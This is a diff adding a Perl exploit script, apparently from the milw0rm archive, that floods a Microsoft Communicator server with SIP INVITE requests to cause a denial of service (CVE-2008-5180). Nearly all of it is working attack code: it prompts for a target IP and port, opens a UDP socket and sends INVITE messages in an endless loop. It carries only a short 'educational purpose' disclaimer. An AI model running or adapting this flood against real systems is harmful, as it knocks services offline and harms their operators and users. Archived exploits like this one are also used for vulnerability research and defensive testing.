@@ -1,0 +1,57 @@
+#!usr/bin/perl -w
+
+################################################################################################################
+#    Microsoft Communicator allows remote attackers to cause a denial of service (memory consumption) via
+#    a large number of SIP INVITE requests, which trigger the creation of many sessions.
+#
+#    Refer:
+#    http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2008-5180
+#    http://xforce.iss.net/xforce/xfdb/46673
+#
+#
+#    To run this exploit on MS Windows replace "#!usr/bin/perl -w" with "#!Installation_path_for_perl -w"
+#    (say #!C:/Program Files/Perl/bin/perl -w)
+#
+#     This was strictly written for educational purpose. Use it at your own risk.
+#    Author will not bare any responsibility for any damages watsoever.
+#
+#        Author:    Praveen Darshanam
+#        Email:     praveen[underscore]recker[at]sify.com
+#        Date:      27th November, 2008
+#
+#    NOTE:    Thanks to all my colleagues at iPolicy Networks for making this possible.
+#            For reliable security solutions please visit http://www.ipolicynetworks.com/
+#
+##################################################################################################################
+
+
+use IO::Socket;
+
+print("\nEnter IP Address of Vulnerable MS Communicator Server: \n");
+$vuln_host_ip = <STDIN>;
+
+############################################################
+#default port on which SIP works is UDP 5060
+#go thru http://technet.microsoft.com/en-us/library/bb963969.aspx for default ports
+###################
+
+print("\nEnter UDP port for MS Communicator Server: \n");
+$port = <STDIN>;
+
+$sock_sip = IO::Socket::INET->new(    PeerAddr => $vuln_host_ip,
+                                     PeerPort => $port,
+                                     Proto    => 'udp') || "Unable to create Socket";
+#if the server is configured on TCP replace 'udp' with 'tcp'.
+
+while(1)
+{
+print $sock_sip "INVITE sip:arpman.malicious.com SIP/2.0\r\nVia: SIP/2.0/UDP 172.16.16.4;branch=123-4567-900\r\n";
+
+
+#kill by pressing Ctrl+c to stop flood of packets
+}
+
+#program never comes here for execution
+close($sock_sip);
+
+# milw0rm.com [2008-11-28]
